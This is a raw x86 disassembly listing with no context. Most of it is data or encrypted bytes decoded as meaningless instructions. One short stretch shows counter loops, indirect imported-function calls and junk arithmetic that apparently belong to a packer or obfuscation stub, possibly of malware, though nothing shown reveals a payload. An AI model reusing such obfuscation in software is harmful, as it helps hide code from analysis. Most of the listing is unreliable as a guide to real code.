  418dc8:	add    BYTE PTR [ecx],0xfd
  418dcb:	adc    cl,0x29
  418dce:	adc    ecx,DWORD PTR [eax+0x70]
  418dd1:	mov    ch,BYTE PTR [eax+0x494d9389]
  418dd7:	dec    esp
  418dd8:	ins    BYTE PTR es:[edi],dx
  418dd9:	and    dh,BYTE PTR [esi]
  418ddb:	jo     0x418d7d
  418ddd:	sbb    al,0xc4
  418ddf:	jl     0x418e32
  418de1:	mov    bh,0x14
  418de3:	mov    BYTE PTR [ebx],al
  418de5:	rol    DWORD PTR [ebx+0x25],1
  418de8:	(bad)  
  418de9:	sub    ch,BYTE PTR [ecx-0x60]
  418dec:	icebp  
  418ded:	pop    eax
  418dee:	sub    ecx,edi
  418df0:	(bad)  
  418df1:	imul   BYTE PTR [ebx-0x45]
  418df4:	and    DWORD PTR [edx+0x44],eax
  418df7:	retf   0xfeae
  418dfa:	xchg   DWORD PTR [ebx+0x1e],eax
  418dfd:	mov    dl,al
  418dff:	pop    ebx
  418e00:	clc    
  418e01:	(bad)  
  418e02:	stos   DWORD PTR es:[edi],eax
  418e03:	cs (bad) 
  418e05:	rcr    BYTE PTR [edi+0x3a],1
  418e08:	push   esi
  418e09:	jmp    DWORD PTR [esi+0x16]
  418e0c:	mov    al,BYTE PTR [edi+0x1e]
  418e0f:	inc    esp
  418e10:	rcl    dh,0x9a
  418e13:	push   ss
  418e14:	adc    eax,DWORD PTR [ebx+0x62e28447]
  418e1a:	mov    eax,ds:0xf7dadaa6
  418e1f:	leave  
  418e20:	lds    edx,FWORD PTR [edi+eiz*4]
  418e23:	sub    DWORD PTR [edx],0x37
  418e26:	add    ch,bl
  418e28:	(bad)
  418e2c:	lahf   
  418e2d:	pop    edi
  418e2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e2f:	out    dx,al
  418e30:	cmp    BYTE PTR [ebx],0xb1
  418e33:	jno    0x418dfa
  418e35:	arpl   WORD PTR [edi+ebp*4+0x310e2775],di
  418e3c:	aas    
  418e3d:	loopne 0x418dda
  418e3f:	popf   
  418e40:	mov    edx,0x35b0f7e7
  418e45:	jp     0x418e7c
  418e47:	pop    ebx
  418e48:	xlat   BYTE PTR ds:[ebx]
  418e49:	jmp    0x418e9a
  418e4b:	jnp    0x418e0d
  418e4d:	push   ds
  418e4e:	fidiv  WORD PTR [edx+0x58]
  418e51:	lds    ebx,FWORD PTR [esi+eax*1]
  418e54:	cmc    
  418e55:	(bad)  [esi+eax*4]
  418e58:	inc    esi
  418e59:	lods   eax,DWORD PTR ds:[esi]
  418e5a:	xlat   BYTE PTR ds:[ebx]
  418e5b:	xor    dl,dh
  418e5d:	xor    BYTE PTR [ebx-0x1066ad4c],ah
  418e63:	cmp    ah,BYTE PTR [edi-0x2]
  418e66:	lods   al,BYTE PTR ds:[esi]
  418e67:	sub    al,0x89
  418e69:	xor    BYTE PTR [ecx],bl
  418e6b:	push   DWORD PTR [eax]
  418e6d:	mov    eax,DWORD PTR [ebp+0x10]
  418e70:	jmp    0x41918a
  418e75:	retf   
  418e76:	rol    dl,cl
  418e78:	(bad)  
  418e79:	(bad)  
  418e7b:	leave  
  418e7c:	shl    DWORD PTR [esi+0x11],1
  418e7f:	(bad)  
  418e81:	or     esi,DWORD PTR [ecx-0x16]
  418e84:	cmp    al,0xd
  418e86:	sar    BYTE PTR [edi+0x78],0x7b
  418e8a:	jle    0x418f04
  418e8c:	js     0x418e52
  418e8e:	dec    eax
  418e8f:	gs lahf 
  418e91:	ficom  WORD PTR [edi-0xb]
  418e94:	sub    BYTE PTR [edx+0x4b],cl
  418e97:	cmp    esp,DWORD PTR [eax-0x3e1e36ef]
  418e9d:	jae    0x418e62
  418e9f:	aad    0x8e
  418ea1:	shl    DWORD PTR [eax+0x56],0xa3
  418ea5:	daa    
  418ea6:	cmp    bl,BYTE PTR [ecx]
  418ea8:	push   esi
  418ea9:	les    edx,FWORD PTR [edi]
  418eab:	sbb    DWORD PTR [edi-0x143f11d],edx
  418eb1:	fcmovnbe st,st(4)
  418eb3:	dec    ebx
  418eb4:	hlt    
  418eb5:	xor    esp,esi
  418eb7:	mov    ds:0x46c4ae6f,eax
  418ebc:	xor    eax,0xfb4b63ac
  418ec1:	loopne 0x418edd
  418ec3:	sub    ch,BYTE PTR [eax+0x288c6361]
  418ec9:	push   edi
  418eca:	ret    
  418ecb:	add    BYTE PTR [ecx+0xa],dh
  418ece:	mov    cl,0xf7
  418ed0:	xor    eax,0x5fd0aee6
  418ed5:	retf   0xe040
  418ed8:	dec    esp
  418ed9:	add    al,0xba
  418edb:	mov    edx,0xbdd53ce2
  418ee0:	in     eax,0xd8
  418ee2:	fisub  WORD PTR [ecx-0x674c55d9]
  418ee8:	dec    esp
  418ee9:	cmp    eax,0xf20606f3
  418eee:	out    dx,al
  418eef:	add    eax,0xb4f9a4c1
  418ef4:	cmp    esi,edi
  418ef6:	xchg   esi,eax
  418ef7:	cmp    dl,BYTE PTR [eax-0x66]
  418efa:	jb     0x418f24
  418efc:	jmp    0xe9f6:0xd4ef9867
  418f03:	in     al,dx
  418f04:	sbb    eax,0x153d721d
  418f09:	adc    eax,DWORD PTR ss:[eax+0x6b210d52]
  418f10:	or     bh,BYTE PTR [esi+edi*4]
  418f13:	test   eax,0xbdd342e0
  418f18:	xchg   ebx,eax
  418f19:	dec    edi
  418f1a:	push   ebp
  418f1b:	adc    al,0x34
  418f1d:	repnz pop ds
  418f1f:	jmp    0x418ed1
  418f21:	das    
  418f22:	or     ebx,DWORD PTR [ecx]
  418f24:	push   edi
  418f25:	cmp    BYTE PTR [esi+0xe],0xaf
  418f29:	mov    dl,0xf6
  418f2b:	or     bh,BYTE PTR [edx+0x32]
  418f2e:	jge    0x418f50
  418f30:	add    ebp,DWORD PTR [edx-0x13bf8a83]
  418f36:	dec    ebx
  418f37:	mov    ds:0x2b3c5433,al
  418f3c:	or     ch,BYTE PTR [esi]
  418f3e:	and    al,0xa
  418f40:	outs   dx,DWORD PTR ds:[esi]
  418f41:	jg     0x418ee0
  418f43:	mov    dh,0x1
  418f45:	mov    ebx,0x52064511
  418f4a:	(bad)  
  418f4b:	leave  
  418f4c:	jl     0x418f31
  418f4e:	popf   
  418f4f:	out    0x2f,al
  418f51:	dec    edi
  418f52:	xchg   esp,eax
  418f53:	cmp    dh,BYTE PTR [ebx]
  418f55:	std    
  418f56:	aam    0xfb
  418f58:	jp     0x418efe
  418f5a:	mov    dl,0x2
  418f5c:	pop    ss
  418f5d:	test   ch,ah
  418f5f:	(bad)  
  418f60:	stos   DWORD PTR es:[edi],eax
  418f61:	ins    DWORD PTR es:[edi],dx
  418f62:	cmc    
  418f63:	stos   BYTE PTR es:[edi],al
  418f64:	pushf  
  418f65:	adc    eax,0xbf43b554
  418f6a:	mov    esi,0xdc1a34ac
  418f6f:	dec    ebp
  418f70:	sub    ecx,ebx
  418f72:	mov    cs,ecx
  418f74:	popa   
  418f75:	mov    dl,0x6a
  418f77:	push   eax
  418f78:	dec    edx
  418f79:	add    DWORD PTR [ebx],0xffffffa0
  418f7c:	jno    0x418f41
  418f7e:	sbb    al,0x16
  418f80:	fild   DWORD PTR [esi+0x67ae8039]
  418f86:	mov    al,0x4f
  418f88:	push   cs
  418f89:	mov    al,BYTE PTR [esi-0x3096a20b]
  418f8f:	mov    edi,0xcc3d143a
  418f94:	fstp   QWORD PTR [eax]
  418f96:	outs   dx,DWORD PTR ds:[esi]
  418f97:	sbb    BYTE PTR [edx-0x44],dh
  418f9a:	or     al,0x86
  418f9c:	gs pop edx
  418f9e:	inc    edi
  418f9f:	mov    ecx,0x85ba220
  418fa4:	loop   0x418f50
  418fa6:	push   ecx
  418fa7:	mov    ch,0xf2
  418fa9:	cmp    ebx,esp
  418fab:	and    eax,0x4c5eeeee
  418fb0:	fst    DWORD PTR [eax+ebx*2]
  418fb3:	out    0x53,eax
  418fb5:	jmp    0xa06e:0x58d5164e
  418fbc:	adc    ch,BYTE PTR [edi+0x2a]
  418fbf:	sbb    DWORD PTR [edi],ebx
  418fc1:	jmp    0x9b2cb156
  418fc6:	mov    ds:0x2898f678,eax
  418fcb:	pop    eax
  418fcc:	imul   edi,esi,0xfffffff5
  418fcf:	jnp    0x418f6f
  418fd1:	add    eax,0x72471be0
  418fd6:	cdq    
  418fd7:	ins    DWORD PTR es:[edi],dx
  418fd8:	hlt    
  418fd9:	int3   
  418fda:	les    esp,FWORD PTR [ebx+0x20ce85b7]
  418fe0:	cwde   
  418fe1:	jle    0x418ff3
  418fe3:	test   eax,0x89aeb736
  418fe8:	and    bl,BYTE PTR ds:0xe2ffaeb
  418fee:	das    
  418fef:	into   
  418ff0:	gs aam 0x8
  418ff3:	dec    ecx
  418ff4:	je     0x419051
  418ff6:	jne    0x418fd2
  418ff8:	pusha  
  418ff9:	ret    
  418ffa:	mov    bh,0x28
  418ffc:	adc    bh,cl
  418ffe:	int    0xf4
  419000:	pushf  
  419001:	mov    eax,ds:0x6d17e628
  419006:	loope  0x418fb7
  419008:	mov    bh,0x61
  41900a:	pop    ecx
  41900b:	rcr    DWORD PTR [ebp+0x42],0x51
  41900f:	daa    
  419010:	mov    eax,0xacb6db59
  419015:	les    edx,FWORD PTR [esi-0x4cacbeec]
  41901b:	(bad)  
  41901c:	(bad)  
  41901d:	xchg   ebp,eax
  41901e:	cmp    al,0x50
  419020:	mov    al,0x9a
  419022:	mov    edi,0xbc6b4610
  419027:	cwde   
  419028:	fiadd  WORD PTR [esi+0x54]
  41902b:	(bad)  
  41902c:	lock push ds
  41902e:	fwait
  41902f:	add    al,bh
  419031:	frstor [eax-0x5b3cfbd5]
  419037:	cmp    esp,DWORD PTR [esi]
  419039:	dec    si
  41903b:	jmp    0x382c135c
  419040:	adc    cl,BYTE PTR [ecx-0x5b]
  419043:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419044:	sub    al,0xfe
  419046:	xchg   DWORD PTR [edx],eax
  419048:	imul   ebx,DWORD PTR [eax-0x3599a0d8],0x563441f4
  419052:	cmp    al,0xaf
  419054:	push   ecx
  419055:	bound  esp,QWORD PTR [edi-0x62372e03]
  41905b:	push   0x74fd3cbd
  419060:	pushf  
  419061:	pop    ss
  419062:	adc    al,0xab
  419064:	xor    BYTE PTR [esi+0x1],ah
  419067:	jae    0x418ffc
  419069:	add    al,0x79
  41906b:	(bad)  
  41906c:	xlat   BYTE PTR ds:[ebx]
  41906d:	mov    esp,0x7591d66
  419072:	xlat   BYTE PTR ds:[ebx]
  419073:	adc    ebx,DWORD PTR ds:0x29bde432
  419079:	adc    BYTE PTR [ebp-0x26],bl
  41907c:	or     al,ch
  41907e:	xchg   edx,eax
  41907f:	sbb    al,0x99
  419081:	stc    
  419082:	push   ebx
  419083:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419084:	push   cs
  419085:	in     eax,0x23
  419087:	nop
  419088:	mul    DWORD PTR [eax+0x34522861]
  41908e:	fstp   DWORD PTR [ebp+esi*4-0x35]
  419092:	repnz mov BYTE PTR [eax+0x7b],dh
  419096:	xor    cl,cl
  419098:	cmp    bh,BYTE PTR [edi]
  41909a:	mov    eax,ds:0x328376b
  41909f:	xor    DWORD PTR [ebp+0x4c],ecx
  4190a2:	sbb    edi,DWORD PTR [esi]
  4190a4:	pushf  
  4190a5:	aad    0xe6
  4190a7:	inc    esi
  4190a8:	aad    0xe3
  4190aa:	cli    
  4190ab:	cld    
  4190ac:	jbe    0x419095
  4190ae:	icebp  
  4190af:	push   edx
  4190b0:	jg     0x4190a7
  4190b2:	mov    ch,0xbf
  4190b4:	retf   
  4190b5:	inc    ebp
  4190b6:	xchg   ecx,eax
  4190b7:	test   BYTE PTR [eax+ebx*1],bl
  4190ba:	inc    edx
  4190bb:	sbb    eax,0x7dea6e1c
  4190c0:	(bad)  
  4190c1:	pop    esi
  4190c2:	inc    eax
  4190c3:	mov    dl,0x8d
  4190c5:	inc    ecx
  4190c6:	(bad)  
  4190c7:	hlt    
  4190c8:	loop   0x41912e
  4190ca:	push   cx
  4190cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190cd:	lods   eax,DWORD PTR ds:[esi]
  4190ce:	cmc    
  4190cf:	mov    dl,0xb6
  4190d1:	pusha  
  4190d2:	into   
  4190d3:	fstp   TBYTE PTR [ebx-0x1f1b7452]
  4190d9:	adc    eax,0x2d9bfb1c
  4190de:	sub    cl,BYTE PTR [ecx]
  4190e0:	mov    ebp,0xb02b5290
  4190e5:	sbb    esp,DWORD PTR [eax-0x5fa3dd24]
  4190eb:	mov    dl,0x23
  4190ed:	outs   dx,DWORD PTR ds:[esi]
  4190ee:	push   0x43c653f5
  4190f3:	adc    eax,0xa419a382
  4190f8:	push   ebx
  4190f9:	inc    ecx
  4190fa:	sti    
  4190fb:	test   DWORD PTR [ecx+edx*1-0x2a019b64],0x6dfaf7ee
  419106:	ins    DWORD PTR es:[edi],dx
  419107:	test   DWORD PTR [edi-0x33],esp
  41910a:	push   ss
  41910b:	inc    edi
  41910c:	int    0x56
  41910e:	dec    ebx
  41910f:	add    BYTE PTR [ebp+0x27c4e55e],ah
  419115:	cdq    
  419116:	(bad)  
  419117:	sbb    esp,edi
  419119:	lds    edi,FWORD PTR [ebp+0x72]
  41911c:	inc    edi
  41911d:	cs inc eax
  41911f:	inc    esi
  419120:	and    BYTE PTR [esi-0x1aa1e6f1],ah
  419126:	int    0x41
  419128:	sbb    ecx,DWORD PTR [ecx]
  41912a:	ffreep st(2)
  41912c:	popf   
  41912d:	iret   
  41912e:	aam    0x39
  419130:	call   0x6f8a:0xd464480b
  419137:	mov    edx,0xeb87f5f7
  41913c:	or     bl,ah
  41913e:	mov    es:0x616029f6,eax
  419144:	mov    esp,0x225e8cf6
  419149:	iret   
  41914a:	jmp    0x4191a2
  41914c:	loopne 0x419183
  41914e:	adc    DWORD PTR [edi-0x3f904492],edx
  419154:	repz push ds
  419156:	out    0x56,al
  419158:	aas    
  419159:	stos   BYTE PTR es:[edi],al
  41915a:	dec    eax
  41915b:	add    eax,0xa3c91e0a
  419160:	pop    eax
  419161:	push   cs
  419162:	faddp  st(4),st
  419164:	mov    dh,0x6c
  419166:	pop    ss
  419167:	or     al,0xe7
  419169:	test   al,0x78
  41916b:	adc    al,0xe7
  41916d:	lods   al,BYTE PTR ds:[esi]
  41916e:	inc    edi
  41916f:	sub    eax,0x32444465
  419174:	int    0x28
  419176:	cwde   
  419177:	xchg   edx,eax
  419178:	(bad)  
  419179:	ficom  WORD PTR [edx]
  41917b:	sbb    DWORD PTR [esi],0x9966dc4
  419181:	jbe    0x419170
  419183:	jmp    0x419143
  419185:	mov    ss,WORD PTR [esi]
  419187:	ret    
  419188:	scas   eax,DWORD PTR es:[edi]
  419189:	cmp    bh,bh
  41918b:	shr    cl,1
  41918d:	add    eax,DWORD PTR [eax]
  41918f:	add    BYTE PTR [eax],al
  419191:	mov    eax,DWORD PTR [ebp+0x10]
  419194:	leave  
  419195:	ret    0xc
  419198:	push   ebp
  419199:	mov    ebp,esp
  41919b:	sub    esp,0x30
  41919e:	jmp    0x4193d3
  4191a3:	rcl    edx,cl
  4191a5:	ret    0xc13e
  4191a8:	into   
  4191a9:	rcl    ecx,cl
  4191ab:	daa    
  4191ac:	jle    0x419228
  4191ae:	mov    cs,WORD PTR [edx+0x80cdc69]
  4191b4:	lds    edi,FWORD PTR [edi+0x78]
  4191b7:	adc    BYTE PTR [esi+0x78],bh
  4191ba:	js     0x41922d
  4191bc:	sbb    bh,BYTE PTR [edx+0x35]
  4191bf:	and    ebp,DWORD PTR [ecx-0x7d]
  4191c2:	sbb    ebp,DWORD PTR [edx]
  4191c4:	jnp    0x4191d9
  4191c6:	sti    
  4191c7:	or     eax,0x1256af5c
  4191cc:	adc    esp,DWORD PTR [ecx-0x3242340e]
  4191d2:	icebp  
  4191d3:	test   al,0x18
  4191d5:	pop    esp
  4191d6:	or     ch,BYTE PTR [edi]
  4191d8:	and    edi,ebp
  4191da:	stos   BYTE PTR es:[edi],al
  4191db:	push   ss
  4191dc:	and    bh,BYTE PTR [eax]
  4191de:	sbb    cl,cl
  4191e0:	sub    ebp,esi
  4191e2:	rol    BYTE PTR [ebx-0x129b776f],0x4d
  4191e9:	inc    esp
  4191ea:	fidivr DWORD PTR [ebx-0x40d4eb92]
  4191f0:	dec    eax
  4191f1:	sbb    al,0xcc
  4191f3:	pop    eax
  4191f4:	pop    esi
  4191f5:	adc    DWORD PTR [esi+0x220418a1],0x46
  4191fc:	push   cs
  4191fd:	inc    ecx
  4191fe:	fisttp WORD PTR [ecx-0x32]
  419201:	mov    DWORD PTR [ebp+0x31425d99],eax
  419207:	cmc    
  419208:	call   0x2fe61c05
  41920d:	clc    
  41920e:	stos   DWORD PTR es:[edi],eax
  41920f:	fcomp  st(2)
  419211:	adc    esi,0x4e
  419214:	push   ds
  419215:	pop    es
  419216:	pop    edi
  419217:	arpl   WORD PTR [esi+0x67b91c4e],si
  41921d:	jbe    0x4191ce
  41921f:	push   ebx
  419220:	and    ebp,eax
  419222:	ror    DWORD PTR [eax+edi*4+0x46],1
  419226:	xor    ch,al
  419228:	in     eax,dx
  419229:	or     DWORD PTR [ebx+ebx*2+0x37],0x2d3ccfd6
  419231:	xor    al,bl
  419233:	shr    DWORD PTR [edx-0x11],1
  419236:	mov    esi,0xe75d1fe2
  41923b:	sbb    dh,ch
  41923d:	pop    ecx
  41923e:	mov    bl,ah
  419240:	sub    esi,DWORD PTR [edi]
  419242:	push   edi
  419243:	test   al,0xc0
  419245:	mov    WORD PTR [esi],ds
  419247:	or     dh,BYTE PTR ds:0x9ee1b435
  41924d:	shl    BYTE PTR [ebx],0xc6
  419250:	add    esp,ebx
  419252:	pop    es
  419253:	add    DWORD PTR [edi],eax
  419255:	sbb    eax,0x9a176208
  41925a:	sbb    al,0x27
  41925c:	xchg   edx,eax
  41925d:	stc    
  41925e:	ss in  al,dx
  419260:	test   ebx,ecx
  419262:	jmp    0x5d58:0x957af694
  419269:	mov    al,0x7f
  41926b:	test   eax,0x4e1bba97
  419270:	(bad)  ds:0x24fe3bcc
  419276:	pusha  
  419277:	xchg   edi,eax
  419278:	scas   al,BYTE PTR es:[edi]
  419279:	push   ecx
  41927a:	pop    eax
  41927b:	add    DWORD PTR [esi+ecx*1],ebx
  41927e:	jno    0x419245
  419280:	outs   dx,BYTE PTR ds:[esi]
  419281:	dec    esi
  419282:	pop    es
  419283:	inc    ecx
  419284:	jnp    0x419265
  419286:	das    
  419287:	pop    ecx
  419288:	repnz add eax,0x3c182dd2
  41928e:	call   0xf7c9694a
  419293:	sub    bh,BYTE PTR [esi]
  419295:	push   ebp
  419296:	or     ah,ch
  419298:	sub    dh,al
  41929a:	adc    edi,eax
  41929c:	mov    ebx,0xcde8db1a
  4192a1:	xchg   esi,eax
  4192a2:	push   0x1280351b
  4192a7:	icebp  
  4192a8:	pop    esp
  4192a9:	inc    ecx
  4192aa:	cmp    dl,ah
  4192ac:	add    bh,BYTE PTR [edx-0x72db64d3]
  4192b2:	adc    cl,BYTE PTR [edx]
  4192b4:	or     al,0x97
  4192b6:	jg     0x419333
  4192b8:	xchg   esp,eax
  4192b9:	test   BYTE PTR [esi-0x3d6e3b30],0x51
  4192c0:	loope  0x4192d3
  4192c2:	sbb    DWORD PTR [ebp+0x7ef47d45],ebp
  4192c8:	in     al,dx
  4192c9:	sbb    eax,0x193c4822
  4192ce:	repz and eax,0x517ded83
  4192d4:	push   ecx
  4192d5:	stc    
  4192d6:	jmp    0x419345
  4192d8:	lea    esi,ds:0xfdefb56c
  4192de:	pop    ebp
  4192df:	adc    edi,ebp
  4192e1:	push   edi
  4192e2:	sbb    ah,ch
  4192e4:	aam    0xd0
  4192e6:	hlt    
  4192e7:	or     esi,esp
  4192e9:	adc    al,0x31
  4192eb:	lock je 0x4192c4
  4192ee:	xchg   DWORD PTR [edi-0x7e],ebp
  4192f1:	retf   0x2084
  4192f4:	cwde   
  4192f5:	push   0x5d26e240
  4192fa:	cmp    eax,0xb6ddfd4e
  4192ff:	or     edi,DWORD PTR [esi]
  419301:	retf   
  419302:	test   BYTE PTR [edi-0x5ffa75d6],al
  419308:	lds    ebp,FWORD PTR gs:[edx]
  41930b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41930c:	rcl    bl,1
  41930e:	adc    eax,0x7603b8f6
  419313:	dec    edi
  419314:	enter  0xc43,0x14
  419318:	outs   dx,DWORD PTR ds:[esi]
  419319:	and    al,0x3a
  41931b:	fld    DWORD PTR [ebp+0x18]
  41931e:	leave  
  41931f:	inc    eax
  419320:	rol    DWORD PTR [ecx+eax*4-0x4c],cl
  419324:	jno    0x4192fb
  419326:	jnp    0x41939e
  419328:	xchg   bl,ah
  41932a:	mov    ebx,0x28e5fee5
  41932f:	je     0x419313
  419331:	cld    
  419332:	bound  ecx,QWORD PTR [edx+0x23754e60]
  419338:	inc    ebx
  419339:	xchg   esi,eax
  41933a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41933b:	sbb    bl,BYTE PTR [edx-0x36bcf18]
  419341:	fwait
  419342:	xlat   BYTE PTR ds:[ebx]
  419343:	gs pop ecx
  419345:	je     0x41937e
  419347:	int3   
  419348:	mov    esp,0x25d479be
  41934d:	push   edi
  41934e:	adc    al,0x65
  419350:	add    ah,0x9d
  419353:	mov    esp,0x2d0aab67
  419358:	mov    ah,al
  41935a:	mov    eax,ds:0x7360c3c
  41935f:	or     eax,0xf7c6a3d3
  419364:	enter  0xf145,0x5a
  419368:	or     cl,BYTE PTR [esi]
  41936a:	call   0x9aacbc28
  41936f:	out    0x3b,al
  419371:	int    0xe1
  419373:	repz adc dl,bl
  419376:	pop    esp
  419377:	rcl    DWORD PTR [eax-0x22],1
  41937a:	daa    
  41937b:	xor    eax,DWORD PTR [ecx]
  41937d:	add    ebp,DWORD PTR [esi]
  41937f:	scas   al,BYTE PTR es:[edi]
  419380:	sbb    ch,al
  419382:	pop    ebx
  419383:	pop    ss
  419384:	dec    ecx
  419385:	or     eax,0xf8c6b6de
  41938a:	xchg   esi,eax
  41938b:	xor    al,0x6a
  41938d:	loop   0x41940b
  41938f:	shl    BYTE PTR [ebp-0x50],0xef
  419393:	clc    
  419394:	mov    ebp,0x79511784
  419399:	lods   eax,DWORD PTR ds:[esi]
  41939a:	push   0xfb79c7a0
  41939f:	scas   al,BYTE PTR es:[edi]
  4193a0:	xchg   edx,eax
  4193a1:	push   es
  4193a2:	push   edi
  4193a3:	pop    ds
  4193a4:	dec    BYTE PTR [eax]
  4193a6:	lods   eax,DWORD PTR ds:[esi]
  4193a7:	cmp    bl,BYTE PTR [eax+0x5d075671]
  4193ad:	jmp    0xec0a81a2
  4193b2:	enter  0x725f,0xb2
  4193b6:	pop    esi
  4193b7:	jle    0x419423
  4193b9:	in     eax,dx
  4193ba:	pop    es
  4193bb:	xchg   ebp,eax
  4193bc:	mov    edi,0x7c2f9bb5
  4193c1:	adc    BYTE PTR [ebp+edx*1+0x693409fc],bh
  4193c8:	mov    WORD PTR [ebx+0x19],ss
  4193cb:	push   cs
  4193cc:	jmp    0x419423
  4193ce:	adc    BYTE PTR [edx-0x38f318fa],0x45
  4193d5:	cld    
  4193d6:	cmp    BYTE PTR [ebp+0x2581f89c],al
  4193dc:	jge    0x419386
  4193de:	inc    edx
  4193df:	add    BYTE PTR [eax],al
  4193e1:	add    BYTE PTR [eax],al
  4193e3:	add    BYTE PTR [ebx],dh
  4193e5:	leave  
  4193e6:	add    ecx,DWORD PTR ds:0x42a87d
  4193ec:	inc    ecx
  4193ed:	mov    DWORD PTR ds:0x42a87d,ecx
  4193f3:	cmp    DWORD PTR ds:0x42a87d,0x24
  4193fa:	jne    0x41940b
  419400:	push   0x4f45
  419405:	call   DWORD PTR ds:0x41d278
  41940b:	cmp    DWORD PTR ds:0x42a87d,0x1b
  419412:	jb     0x4193e4
  419418:	and    DWORD PTR ds:0x42a801,0x0
  419422:	jmp    0x419434
  419427:	mov    ecx,DWORD PTR ds:0x42a801
  41942d:	inc    ecx
  41942e:	mov    DWORD PTR ds:0x42a801,ecx
  419434:	cmp    DWORD PTR ds:0x42a801,0x1d
  41943b:	jae    0x419470
  419441:	cmp    DWORD PTR ds:0x42a801,0x1e
  419448:	jne    0x419461
  41944e:	push   0x42a98f
  419453:	push   DWORD PTR [ebp-0x20]
  419456:	push   0x1
  419458:	push   DWORD PTR [ebp-0xc]
  41945b:	call   DWORD PTR ds:0x41d118
  419461:	jmp    0x419427
  419466:	adc    DWORD PTR ds:0x42a7b1,0x7c2
  419470:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  419477:	and    DWORD PTR ds:0x42a80d,0x0
  419481:	mov    ecx,DWORD PTR ds:0x42a80d
  419487:	inc    ecx
  419488:	mov    DWORD PTR ds:0x42a80d,ecx
  41948e:	cmp    DWORD PTR ds:0x42a80d,0x25
  419495:	jne    0x4194a6
  41949b:	push   0x42aa48
  4194a0:	call   DWORD PTR ds:0x41d27c
  4194a6:	cmp    DWORD PTR ds:0x42a80d,0x18
  4194ad:	jb     0x419481
  4194b3:	mov    ecx,DWORD PTR [ebp-0x4]
  4194b6:	mov    eax,ds:0x42a805
  4194bb:	and    DWORD PTR ds:0x42a775,eax
  4194c1:	push   ebx
  4194c2:	add    ebx,ebx
  4194c4:	mov    eax,0x7510850
  4194c9:	and    DWORD PTR ds:0x42a76d,ecx
  4194cf:	xor    ecx,eax
  4194d1:	movzx  ebx,BYTE PTR ds:0x42a779
  4194d8:	adc    DWORD PTR ds:0x42a871,ebx
  4194de:	mov    ebx,0x327298
  4194e3:	adc    DWORD PTR ds:0x42a761,0x50ad
  4194ed:	add    ecx,ebx
  4194ef:	inc    DWORD PTR ds:0x42a87d
  4194f5:	mov    DWORD PTR [ebp-0x1c],ecx
  4194f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4194fb:	push   esi
  4194fc:	mov    DWORD PTR ds:0x42a7f5,0x238f
  419506:	push   edi
  419507:	test   ecx,ecx
  419509:	mov    DWORD PTR ds:0x42a839,0x1f7e
  419513:	je     0x419758
  419519:	jmp    0x41974e
  41951e:	retf   0xd03c
  419521:	(bad)
  419524:	fld    st(3)
  419526:	scas   eax,DWORD PTR es:[edi]
  419527:	inc    eax
  419528:	adc    DWORD PTR [esi+0x76],eax
  41952b:	(bad)  [edx]
  41952d:	cwde   
  41952e:	and    bl,cl
  419530:	jg     0x4195aa
  419532:	adc    BYTE PTR [esi+0x78],bh
  419535:	js     0x4194e5
  419537:	imul   al
  419539:	(bad)  
  41953a:	lock push ecx
  41953c:	mov    cs,WORD PTR [ebx-0x79f271ee]
  419542:	cmp    al,0xa7
  419544:	out    0x56,eax
  419546:	push   edx
  419547:	inc    edi
  419548:	sbb    BYTE PTR [esp+eiz*2+0x28],bl
  41954c:	test   BYTE PTR [ebx-0x62cc2290],bl
  419552:	call   0x657a:0xb8cd975f
  419559:	mov    DWORD PTR [ebx+eiz*2+0x6c95b48d],esp
  419560:	lods   al,BYTE PTR ds:[esi]
  419561:	xor    al,0xc6
  419563:	shl    BYTE PTR [eax],0x66
  419566:	jle    0x4195a5
  419568:	jnp    0x419560
  41956a:	in     eax,dx
  41956b:	push   0xd92ae433
  419570:	mov    edx,0xd8401cf7
  419575:	int3   
  419576:	stos   DWORD PTR es:[edi],eax
  419577:	or     BYTE PTR [esi],ch
  419579:	sahf   
  41957a:	(bad)  
  41957b:	scas   eax,DWORD PTR es:[edi]
  41957c:	cmp    eax,0xcaa3e00c
  419581:	pop    edi
  419582:	je     0x41955d
  419584:	and    cl,ch
  419586:	mov    edx,0x1e488e86
  41958b:	adc    al,0x79
  41958d:	sbb    DWORD PTR [edx-0xe260514],edi
  419593:	inc    edi
  419594:	(bad)  
  419595:	enter  0x9233,0x88
  419599:	cmc    
  41959a:	pop    edx
  41959b:	pop    ss
  41959c:	push   ebp
  41959d:	xchg   ebx,eax
  41959e:	push   esi
  41959f:	pop    edx
  4195a0:	sbb    esp,DWORD PTR [ecx+0x3a]
  4195a3:	mov    bl,0xdc
  4195a5:	adc    BYTE PTR [ecx],ch
  4195a7:	mov    ah,BYTE PTR [eax]
  4195a9:	mov    al,0x8a
  4195ab:	and    eax,0x69f2426a
  4195b0:	(bad)  
  4195b1:	fs push es
  4195b3:	pop    esi
  4195b4:	inc    edx
  4195b5:	or     edx,DWORD PTR [ebp-0x18b1bb7b]
  4195bb:	dec    ebp
  4195bc:	in     eax,dx
  4195bd:	ret    0xdb94
  4195c0:	mov    BYTE PTR [ecx+0x440b2219],cl
  4195c6:	add    esp,DWORD PTR [ebx+ecx*4]
  4195c9:	jle    0x419553
  4195cb:	mov    dl,0x96
  4195cd:	bound  edx,QWORD PTR [esi+0x57]
  4195d0:	(bad)  
  4195d2:	jecxz  0x419566
  4195d4:	lock cmp al,0x95
  4195d7:	adc    eax,0x1c8b913c
  4195dc:	xor    DWORD PTR [eax+0x231a9512],esp
  4195e2:	dec    ebp
  4195e3:	push   edi
  4195e4:	adc    al,0x1a
  4195e6:	cmp    al,BYTE PTR [edi]
  4195e8:	not    BYTE PTR [edi+0x1b252194]
  4195ee:	lea    ecx,[ebp+0x71]
  4195f1:	call   0x604d:0x2491de56
  4195f8:	pop    ecx
  4195f9:	outs   dx,DWORD PTR ds:[esi]
  4195fa:	and    al,0xa7
  4195fc:	add    eax,0x1554f8fe
  419601:	pop    esp
  419602:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419603:	repz and DWORD PTR [eax-0x316cd328],esp
  41960a:	pop    ebx
  41960b:	imul   eax,DWORD PTR [edx+0x44],0x99cb6570
  419612:	adc    BYTE PTR [edi],cl
